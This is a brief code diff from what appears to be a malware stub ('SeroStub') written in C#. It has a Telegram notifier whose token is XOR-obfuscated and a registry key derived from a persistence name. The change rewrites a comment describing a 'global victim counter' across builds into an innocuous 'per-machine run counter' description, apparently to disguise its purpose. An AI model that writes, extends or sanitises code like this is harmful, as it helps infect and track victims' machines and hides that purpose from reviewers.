@@ -8,7 +8,7 @@ namespace SeroStub;
 // Token and chat IDs are XOR-encoded in Config — never stored as plaintext.
 internal static class TelegramNotifier
 {
-    // Global victim counter stored in registry — counts unique machines across all builds.
+    // Per-machine run counter (used only as a tie-breaker if MarkNotified fails and the stub re-fires).
     private static readonly string _counterKey =
         $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_ctr";
 
